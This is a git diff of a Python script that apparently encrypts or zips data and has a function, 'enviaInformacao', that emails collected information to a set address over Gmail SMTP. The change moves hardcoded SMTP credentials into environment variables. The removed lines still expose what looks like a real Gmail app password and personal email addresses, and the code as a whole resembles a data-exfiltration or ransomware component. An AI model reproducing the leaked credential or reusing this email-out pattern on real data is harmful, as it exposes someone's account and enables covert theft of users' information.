@@ -16,6 +16,10 @@ import pyzipper
 from cryptography.fernet import Fernet
 from requests import get
 
+load_dotenv("./config/.env")
+
+print(os.environ.get('MAIL_USER'))
+
 criptografadoNesteMomento = False
 key = ''.encode()
 while True:
@@ -140,10 +144,9 @@ def enviaInformacao():
 
     result = ''.join(''.join(map(str, tup)) for tup in dados)
     print(result)
-    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-    server.login("@gmail.com", "muzwoulszlsmoqjx")
-    server.sendmail('jeffersonssantos93@gmail.com',
-                    'jeffersonssantos92@gmail.com', result)
+    server = smtplib.SMTP_SSL(os.environ.get('MAIL_SERVER'), 465)
+    server.login(os.environ.get('MAIL_USER'), os.environ.get('MAIL_PASSWD'))
+    server.sendmail(os.environ.get('MAIL_USER'), os.environ.get('DESTINATION_EMAIL'), result)
     server.quit()
 
 
